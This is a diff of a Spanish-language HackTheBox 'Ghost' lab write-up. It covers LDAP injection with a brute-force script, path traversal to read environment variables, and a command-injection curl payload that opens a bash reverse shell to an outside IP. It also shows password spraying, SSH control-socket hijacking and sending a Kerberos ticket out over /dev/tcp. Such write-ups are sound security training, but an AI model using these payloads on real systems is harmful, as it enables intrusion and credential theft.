@@ -298,62 +298,60 @@ Al tratar de acceder a [https://federation.ghost.htb](https://federation.ghost.h
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Después de una enumeración de subdominios de la página web, añadiremos las siguientes entradas en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep ghost.htb
 10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb gitea.ghost.htb
 ```
 
-
+Al tratar de acceder a [http://intranet.ghost.htb:8008](http://intranet.ghost.htb:8008) nos muestra un panel de inicio de sesión a lo que parece ser la Intranet del sitio web.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a [http://gitea.ghost.htb:8008](http://gitea.ghost.htb:8008) nos encontramos con el siguiente sitio web de la plataforma de Gitea.
 
 <figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al investigar más en la página web de `Gitea` nos encontramos con dos nombres de usuarios que probablemente sean del Directorio Activo (AD).
 
 <figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Shell as Root
-
-
 
 ### LDAP Injection
 
-
-
-INTRANET
-
-
+Interceptaremos la solicitud al intentar acceder al panel de `intranet.ghost.htb` y verificamos que al enviar la solicitud con el usuario `test/test`. Nos devuelve el siguiente mensaje en la respuesta del servidor. También verificamos que los campos del `username` y `password` tienen de nombre la variable algo relacionado con `LDAP`. Lo cual nos hace pensar que por detrás realiza una consulta en LDAP para validar el acceso a la Intranet.
 
 <figure><img src="../../.gitbook/assets/imagen (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Probaremos de inyectar el siguiente carácter `)` para cerrar la query de LDAP y al enviar la solicitud, el servidor nos devuelve un mensaje informando que ha ocurrido un error.
 
 <figure><img src="../../.gitbook/assets/imagen (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Probaremos de realizar un `Authenticacion Bypass` indicándole el nombre de usuario `cassandra.shelton` que encontramos en el `Gitea` e indicándole como contraseña el carácter `*` con lo cual si no está bien configurado, se utilizará como comodín y rellenará el campo de la contraseña.
 
+Al enviar esta solicitud, verificamos que se nos ha generado un Token en la respuesta del servidor, lo cual parece indicarnos que efectivamente hemos podido realizar el `Bypass` correctamente.
 
 <figure><img src="../../.gitbook/assets/imagen (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+A través de la extensión de `Cookie Editor` añadiremos este nuevo Token en la página de [http://intranet.ghost.htb:8008](http://intranet.ghost.htb:8008).
 
 <figure><img src="../../.gitbook/assets/imagen (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Al actualizar la página se nos muestra el acceso correspondiente a la Intranet. En la sección de noticias se nos indica lo siguiente.
 
+{% hint style="info" %}
+En la sección **News** de _intranet.ghost.htb_, encontramos información sobre la migración de **Gitea a Bitbucket**. Los inicios de sesión con credenciales de dominio están deshabilitados, pero mencionan una cuenta **gitea\_temp\_principal** con un token almacenado en **LDAP**. También indican que, temporalmente, el acceso a la intranet requiere un **token secreto** en lugar de la contraseña de dominio.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (13) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a la sección de `Users`, verificamos la existencia de los diferentes usuarios del dominio.
 
 <figure><img src="../../.gitbook/assets/imagen (14) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Nos guardaremos en un archivo, el listado de usuarios del dominio que hemos encontrado en la Intranet.
 
 ```bash
 ❯ cat users.txt
@@ -370,11 +368,19 @@ intranet_principal
 gitea_temp_principal
 ```
 
+En la sección de `Forums` nos encontramos con la siguiente información.
 
+{% hint style="info" %}
+En la sección **News**, encontramos que la migración de publicaciones desde la antigua intranet aún está en proceso, por lo que no es posible publicar o responder por el momento.
+
+También identificamos una conversación donde un usuario intenta conectar con **bitbucket.ghost.htb**, pero recibe un error. Según una respuesta, el problema se debe a que la migración no ha finalizado y la entrada **DNS** aún no está configurada.
+
+Además, hay publicaciones internas sobre logros del equipo y reconocimientos a investigadores, lo que indica una cultura organizativa activa en la intranet.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (15) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Recordando que en la sección de `News` habían indicado que el usuario`gitea_temp_principal` disponía de un token almacenado en LDAP. Por lo cual, lo que realizamos es un script de **LDAP Injection** para intentar obtener las credenciales válidas del usuario indicado a través de iniciar sesión en la Intranet que vimos anteriormente que era vulnerable a LDAP Injection.
 
 ```python
 import string
@@ -420,7 +426,7 @@ while True:
 print(f"[🔓] Contraseña final: {password}")
 ```
 
-
+Al ejecutar el script, verificamos que a través de fuerza bruta, logra encontrar carácter por carácter, lo que parece ser la contraseña del usuario mencionado.
 
 ```bash
 ❯ python3 brute_ldap.py
@@ -444,131 +450,123 @@ print(f"[🔓] Contraseña final: {password}")
 [🔓] Contraseña final: szrr8kpc3z6onlqf
 ```
 
-
+Accederemos nuevamente a [http://gitea.ghost.htb:8008](http://gitea.ghost.htb:8008) de autenticarnos con el usuario encontrado para verificar si disponemos del acceso que indicaban en la sección de `News`.
 
 <figure><img src="../../.gitbook/assets/4571_vmware_kSUg7eN36b.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que hemos logrado acceder correctamente al `Gitea` con el usuario `gitea_temp_principal`.
 
 <figure><img src="../../.gitbook/assets/imagen (16) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Ghost Blog Vulnerabilities
 
-
+En los repositorios que dispone el usuario actual, verificamos de la existencia de los repositoris `blog` y `intranet`.
 
 <figure><img src="../../.gitbook/assets/imagen (17) (1).png" alt=""><figcaption></figcaption></figure>
 
+Al acceder al repositorio`ghost-dev/blog` se nos indica en el archivo`README.md` lo siguiente.
 
+{% hint style="info" %}
+En el **README.md** del repositorio en **Gitea**, encontramos información clave sobre el **Ghost Blog**, que utiliza **Ghost CMS** en un contenedor Docker.
+
+Mencionan una futura integración con la intranet, donde algunas publicaciones serán destacadas o escaneadas. Para ello, han implementado una clave **API** compartida entre la intranet y el blog, almacenada como variable de entorno con el nombre **DEV\_INTRANET\_KEY**.
+
+También han modificado el código fuente de **Ghost CMS**, en particular el archivo **posts-public.js**, para extraer más información de las publicaciones. Indican que, en el futuro, estos datos deberían almacenarse en una base de datos para evitar pérdidas al recrear los contenedores.
+
+Además, han dejado expuesta una **clave API pública** que permite acceso a datos públicos en **Ghost API**, lo que podría ser útil para obtener más información del sistema.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (18) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-dockerfile
+Al acceder a revisar el archivo `Dockerfile` nos encontramos con el siguiente contenido.
 
 <figure><img src="../../.gitbook/assets/imagen (19) (1).png" alt=""><figcaption></figcaption></figure>
 
-docker-compose-yml
+Por otro lado, el archivo `docker-compose.yml` contiene la siguiente configuración.
 
 <figure><img src="../../.gitbook/assets/imagen (20) (1).png" alt=""><figcaption></figcaption></figure>
 
-posts-public.js
+Revisamos el último archivo que disponemos en el repositorio del Blog `posts-public.js` y nos encontramos con el siguiente resultado.
 
 <figure><img src="../../.gitbook/assets/imagen (25) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Using the Ghost API to retrieve Path Traversal vulnerability information
+
+El siguiente paso será hacer uso de la API de Ghost, ya que según la información que recopilamos del Gitea, podíamos hacer uso de esta API a través de la API KEY que nos proporcionaron. Verificaremos el funcionamiento de la API a través de la documentación oficial del CMS.
 
 {% embed url="https://ghost.org/docs/content-api/" %}
 
 <figure><img src="../../.gitbook/assets/imagen (21) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+En la documentación, comprobamos que nos aparece un ejemplo de como utilizar esta API.
 
 <figure><img src="../../.gitbook/assets/imagen (22) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Interceptaremos la solicitud en `BurpSuite` y verificaremos que si podemos hacer uso de la API correctamente.
 
 <figure><img src="../../.gitbook/assets/imagen (23) (1).png" alt=""><figcaption></figcaption></figure>
 
-posts-public.js
+Le pasamos al ChatGPT el contenido del archivo `posts-public.js` para verificar si tenía alguna vulnerabilidad y nos indicó que existía la posibilidad de realizar un `Path Traversal` a través del valor `extra`.
 
 <figure><img src="../../.gitbook/assets/imagen (24) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Trataremos de verificar si podemos revisar el contenido del `/etc/passwd` del equipo a través de la vulnerabilidad en combinación de la API de Ghost. Verificamos que hemos logrado leer el archivo indicado, por lo tanto, tenemos una vía para enumerar archivos del sistema.
 
 <figure><img src="../../.gitbook/assets/4583_vmware_semX0MY3Ll.png" alt=""><figcaption></figcaption></figure>
 
+Si volvemos a mirar el `Gitea`, recordaremos que se mos menciona que hay una API compartida entre la Intranet y el blog, almacenada como variable de entorno con el nombre de `DEV_INTRANET_KEY`.
 
+{% hint style="info" %}
+**`/proc/self/environ`** es un archivo especial en sistemas Linux que contiene las variables de entorno del proceso que lo lee. Detalles clave:
 
-/proc/self/environ
+Se encuentra en el sistema de archivos proc (/proc/), que es una interfaz al kernel. self es un enlace simbólico al directorio del proceso que lo accede. Contiene las variables de entorno en formato KEY=VALUE, separadas por \0 (carácter nulo).
 
-/proc/self/environ es un archivo especial en sistemas Linux que contiene las variables de entorno del proceso que lo lee. Detalles clave:
-
-```
-Se encuentra en el sistema de archivos proc (/proc/), que es una interfaz al kernel.
-self es un enlace simbólico al directorio del proceso que lo accede.
-Contiene las variables de entorno en formato KEY=VALUE, separadas por \0 (carácter nulo).
-```
-
-Ejemplo de uso:
+**Ejemplo de uso:**
 
 Si ejecutamos:
 
-cat /proc/self/environ
+`cat /proc/self/environ`
 
 Veremos algo como:
 
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0HOME=/root\0USER=root\0...
+`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0HOME=/root\0USER=root\0...`
 
 (Algunos valores pueden no verse bien porque están separados por \0).
 
-Para verlo más claro:
-
-tr '\0' '\n' < /proc/self/environ
-
-Esto mostrará cada variable en una línea. ¿Para qué sirve?
-
-```
-Inspeccionar variables de entorno del proceso actual.
-Depuración o debugging.
-Puede ser útil en exploits, ya que podría exponer credenciales o configuraciones sensibles.
-```
-
-Posibles riesgos
+**Posibles riesgos**
 
 Si un proceso con permisos elevados expone su /proc/self/environ, un atacante podría leer variables sensibles como AWS\_SECRET\_KEY, DATABASE\_PASSWORD, etc.
+{% endhint %}
 
-
+A través del `Path Traversal` revisaremos las variables de entorno al directorio del proceso que lo accede. Verificamos que nos muestra el contenido en la respuesta por parte del servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (26) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Desde `Cyberchef` descodificaremos el contenido recibido y verificamos que logramos obtener la variable de entorno `DEV_INTRANET_KEY` que mencionaban en `Gitea`.
 
 <figure><img src="../../.gitbook/assets/imagen (27) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Using the Ghost API to perform command injection and gain access to the Docker machine
 
-intranet
+Revisaremos el repositorio de `ghost-dev/intranet` el cual contiene la siguiente información en el `README.md`.
+
+{% hint style="info" %}
+Hemos encontrado información en el archivo **README.md** que indica que la intranet y el blog están en proceso de integración. Mientras el desarrollo continúa, han expuesto una **API de desarrollo** en `http://intranet.ghost.htb/api-dev`, lo que podría ser un punto de interés para futuras pruebas.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (28) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Nos descargaremos el repositorio de `Intranet` para revisar el contenido del repositorio de `Intranet`.
 
 <figure><img src="../../.gitbook/assets/imagen (29) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Del archivo comprimido `.zip` que nos hemos descargado, lo descomprimiremos y accederemos al directorio creado.
 
 ```bash
 ❯ unzip intranet.zip; cd intranet
 ```
 
-
+A través del comando `tree` visualizaremos la estructura de los archivos descargados del repositorio `ghost-dev/intranet`.eeeeeeeeeeeee
 
 ```bash
 ❯ tree
@@ -649,7 +647,7 @@ intranet
 23 directories, 50 files
 ```
 
-
+Realizaremos una búsqueda recursiva en todos los archivos para buscar en dónde hacen uso de la `DEV_INTRANET_KEY`. Verificamos que se hace uso de esta clave en el archivo `dev.rs`.
 
 ```bash
 ❯ grep 'DEV_INTRANET_KEY' -r *
@@ -657,7 +655,11 @@ backend/src/api/dev.rs:                if key == std::env::var("DEV_INTRANET_KEY
 backend/.env.example:DEV_INTRANET_KEY=
 ```
 
+Este código implementa un **guardia de acceso** en Rocket, un framework web de Rust. La estructura `DevGuard` se utiliza para verificar si una solicitud tiene un encabezado específico, `X-DEV-INTRANET-KEY`, y si el valor de este encabezado coincide con la variable de entorno `DEV_INTRANET_KEY`.
 
+Si la clave es correcta, se permite el acceso, y el guardia devuelve un **Outcome::Success**. Si la clave es incorrecta o no se proporciona, se devuelve un **Outcome::Error** con un estado de **Unauthorized** (401).
+
+Este guardia protege las rutas que requieren una clave de autenticación para acceder.
 
 {% code title="dev.rs" %}
 ```rust
@@ -690,7 +692,20 @@ impl<'r> FromRequest<'r> for DevGuard {
 ```
 {% endcode %}
 
+Por otro lado, nos encontramos con el siguiente archivo `scan.rs` que se utiliza para lo siguiente.
 
+Este código implementa una ruta en Rocket que permite **escanear URLs** en publicaciones de un blog. La ruta `scan` recibe una solicitud `POST` con una URL en formato JSON, utilizando la estructura `ScanRequest`.
+
+El flujo de funcionamiento es el siguiente:
+
+1. **Autenticación**: Primero, se verifica que la solicitud tenga una clave válida de acceso (`DevGuard`).
+2. **Comando Bash**: Luego, se ejecuta un comando en Bash con la URL proporcionada. Este comando intenta llamar a un script (`intranet_url_check`) que debería verificar si la URL es segura.
+3. **Respuesta**: Dependiendo del resultado de la ejecución del comando, la función responde con un JSON que contiene:
+   * **is\_safe**: Indica si la URL es segura (actualmente siempre es `true`).
+   * **temp\_command\_success**: Informa si el comando se ejecutó correctamente.
+   * **temp\_command\_stdout** y **temp\_command\_stderr**: Muestran las salidas estándar y de error del comando ejecutado.
+
+Este endpoint está diseñado para ser utilizado por el blog para verificar la seguridad de las URLs de los posts.
 
 {% code title="scan.rs" %}
 ```rust
@@ -747,17 +762,24 @@ pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
 ```
 {% endcode %}
 
-
+Le pasaremos el archivo `scan.rs` al ChatGPT para verificar si existen algunas vulnerabilidades en el archivo. En el resultado obtenido, verificamos que podemos realizar un `Command Injection` a través de la entrada de `data.url`.
 
 <figure><img src="../../.gitbook/assets/imagen (30) (1).png" alt=""><figcaption></figcaption></figure>
 
+Por lo tanto, lo que probaremos es de acceder al sistema a través de una Reverse Shell, para ello nos ponemos en escucha con `nc`.
 
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+```
+
+Ejecutamos el siguiente comando para aprovecharnos de la vulnerabilidad descubierta para enviarnos una Reverse Shell.
 
 ```bash
 ❯ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"http://gzzcoo.com;/bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1"}'
 ```
 
-
+Verificamos que hemos ganado acceso al Docker del sistema que levanta la página de Intranet.
 
 ```bash
 ❯ nc -nlvp 443
@@ -770,13 +792,11 @@ hostname -I
 172.18.0.3 
 ```
 
-
-
 ## Shell as Florence.Ramirez
 
-
-
 ### Information leaked in environment variables (env)
+
+Al acceder al equipo, verificamos que nos encontramos como usuario `root`. Verificando las variables de entorno que tenemos, nos encontrams con una variable `LDAP_BIND_PASSWORD` que parecen ser unas credenciales de LDAP.
 
 ```bash
 root@36b733906694:/app# env
@@ -800,7 +820,7 @@ JWT_SECRET=*xopkAGbLyg9bK_A
 _=/usr/bin/env
 ```
 
-
+Realizaremos un `Password Spraying` para verificar si estas credenciales son válidas para algún usuario que disponemos. Verificamos que son las credenciales válidas del usuario `intranet_principal`.
 
 ```bash
 ❯ nxc smb 10.10.11.24 -u users.txt -p 'He!KA9oKVT3rL99j' --continue-on-success
@@ -818,10 +838,10 @@ SMB         10.10.11.24     445    DC01             [+] ghost.htb\intranet_princ
 SMB         10.10.11.24     445    DC01             [-] ghost.htb\gitea_temp_principal:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
 ```
 
-
+Realizaremos una exportación del `BloodHound` para verificar posibles vectores de ataque para elevar nuestros privilegios, de momento no logramos encontrar nada interesante.
 
 ```bash
-❯ netexec ldap 10.10.11.24 -u 'intranet_principal' -p 'He!KA9oKVT3rL99j'  --bloodhound --collection All --dns-server 10.10.11.24
+❯ nxc ldap 10.10.11.24 -u 'intranet_principal' -p 'He!KA9oKVT3rL99j'  --bloodhound --collection All --dns-server 10.10.11.24
 SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
 LDAP        10.10.11.24     389    DC01             [+] ghost.htb\intranet_principal:He!KA9oKVT3rL99j 
 LDAP        10.10.11.24     389    DC01             Resolved collection methods: group, dcom, trusts, localadmin, rdp, acl, session, psremote, container, objectprops
@@ -829,9 +849,9 @@ LDAP        10.10.11.24     389    DC01             Done in 00M 10S
 LDAP        10.10.11.24     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.24_2025-02-07_212001_bloodhound.zip
 ```
 
-
-
 ### Session Hijacking via SSH Control Socket
+
+Volviendo al equipo de Docker, analizamos los archivos y directorios de la raíz. Entre los cuales, nos encontramos con un archivo `docker-entrypoint.sh` en el cual al analizar el script, vemos que mencionan un directorio en `/root/.ssh/controlmaster`.
 
 ```bash
 root@36b733906694:/# ls -l
@@ -865,26 +885,40 @@ mkdir /root/.ssh
 mkdir /root/.ssh/controlmaster
 printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config
 
-exec /app/ghost_intranet
+exec /app/ghost_intranet 
 ```
 
+Accederemos a `/root/.ssh/controlmaster` y verificaremos que existe de un Socket de SSH del usuario `florence.ramirez` al equipo `dev-workstation`.
 
+{% hint style="info" %}
+Un **socket** es un punto de comunicación que permite el intercambio de datos entre dos procesos en una red o en un sistema local. Es un concepto clave en la programación de redes y permite que aplicaciones en diferentes máquinas o en la misma máquina se comuniquen entre sí.
 
+En este caso específico, el archivo **florence.ramirez@ghost.htb@dev-workstation:22** parece ser un **socket de red**. Los sockets se utilizan para establecer conexiones entre clientes y servidores, y se manejan mediante direcciones IP y puertos. Los detalles del nombre del archivo sugieren que es un socket Unix, que generalmente se utiliza para la comunicación entre procesos dentro de la misma máquina.
 
+#### ¿Qué hace un socket?
 
+* **Enlace entre procesos**: Un socket permite que dos aplicaciones, ya sea en la misma máquina o en máquinas diferentes, se comuniquen a través de la red.
+* **Tipos de sockets**:
+  * **Sockets de flujo** (TCP): Utilizados para una conexión fiable.
+  * **Sockets de datagramas** (UDP): Utilizados para comunicación sin conexión y más rápida, aunque menos fiable.
 
+En este caso, el archivo indica que se trata de un **socket Unix** que está siendo utilizado por el servicio en el puerto 22, lo que sugiere que se está manejando alguna comunicación interna relacionada con SSH o un servicio similar entre procesos en la máquina.
+
+Por tanto, este archivo de socket podría estar facilitando una comunicación entre aplicaciones o servicios relacionados con el sistema `florence.ramirez@ghost.htb` y `dev-workstation`.
+{% endhint %}
 
 ```bash
-root@36b733906694:~/.ssh/controlmaster# ls -la
+root@36b733906694:~/.ssh/controlmaster$ ls -la
 total 12
 drwxr-xr-x 1 root root 4096 Feb  7 17:47 .
 drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
 srw------- 1 root root    0 Feb  7 17:47 florence.ramirez@ghost.htb@dev-workstation:22
-root@36b733906694:~/.ssh/controlmaster# file florence.ramirez\@ghost.htb\@dev-workstation\:22 
+
+root@36b733906694:~/.ssh/controlmaster$ file florence.ramirez\@ghost.htb\@dev-workstation\:22 
 florence.ramirez@ghost.htb@dev-workstation:22: socket
 ```
 
-
+Al ejecutar el comando `ssh -O check`, revisamos si existe una conexión SSH multiplexada activa. La respuesta `Master running (pid=24)` confirma que la conexión principal está activa. Luego, con `hostname -I`, obtuvimos la dirección IP de la máquina remota, que es `172.18.0.2`. Finalmente, al usar `id`, vimos que el usuario conectado es `florence.ramirez` (UID 50), y pertenece a los grupos `staff` e `it`.
 
 ```bash
 root@36b733906694:~/.ssh/controlmaster# ssh -O check -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
@@ -895,15 +929,11 @@ florence.ramirez@LINUX-DEV-WS01:~$ id
 uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
 ```
 
-
-
 ### Reusing a Valid TGT for Lateral Movement
 
-
+Al analizar nuevamente las variables de entorno de este nuevo usuario, verificamos que parece haber un Ticket Granting Ticket (TGT) del usuario que disponemos. Este ticket se encuentra almacenado enla variable `KRB5CCNAME` en el directorio `/tmp/krb5cc_50`.
 
 ```bash
-florence.ramirez@LINUX-DEV-WS01:~$ id
-uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
 florence.ramirez@LINUX-DEV-WS01:~$ env
 SHELL=/bin/bash
 PWD=/home/GHOST/florence.ramirez
@@ -921,27 +951,27 @@ SSH_TTY=/dev/pts/0
 _=/usr/bin/env
 ```
 
-
+Accederemos al directorio mencionado, y comprobaremos de la existencia del TGT.
 
 ```bash
 florence.ramirez@LINUX-DEV-WS01:/tmp$ ls -la krb5cc_50 
 -rw------- 1 florence.ramirez staff 1650 Feb  7 19:49 krb5cc_50
 ```
 
-
+En nuestro equipo atacante, nos pondremos en escucha para recibir el archivo mencionado.
 
 ```bash
 ❯ nc -nlvp 443 > krb5cc_50
 listening on [any] 443 ...
 ```
 
-
+Desde el equipo víctima, enviaremos el archivo a través del `/dev/tcp`.
 
 ```bash
 florence.ramirez@LINUX-DEV-WS01:/tmp$ cat krb5cc_50 > /dev/tcp/10.10.16.7/443
 ```
 
-
+Verificamos que disponemos de este archivo en nuestro equipo local correctamente.
 
 ```bash
 ❯ ls -l krb5cc_50
@@ -950,10 +980,11 @@ florence.ramirez@LINUX-DEV-WS01:/tmp$ cat krb5cc_50 > /dev/tcp/10.10.16.7/443
 krb5cc_50: data
 ```
 
-
+Exportaremos el TGT en la variable `KRB5CCNAME` y verificaremos que el ticket es válido y lo podemos utilizar.
 
 ```bash
 ❯ export KRB5CCNAME=$(pwd)/krb5cc_50
+
 ❯ klist -i
 Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/krb5cc_50
 Default principal: florence.ramirez@GHOST.HTB
@@ -963,7 +994,7 @@ Valid starting     Expires            Service principal
 	renew until 08/02/25 20:51:01
 ```
 
-
+A través de `nxc`, validaremos que el `TGT` es válido y podemos hacer uso de este para autenticarnos como el usuario `florence.ramirez` sin disponer de sus credenciales.
 
 ```bash
 ❯ nxc smb 10.10.11.24 -u 'florence.ramirez' -k --use-kcache
@@ -971,11 +1002,7 @@ SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Buil
 SMB         10.10.11.24     445    DC01             [+] ghost.htb\florence.ramirez from ccache 
 ```
 
-
-
 ## Shell as justin.bradley
-
-
 
 ### DNS Spoofing to Capture NTLMv2 Hash from User Attempting to Access Bitbucket
 
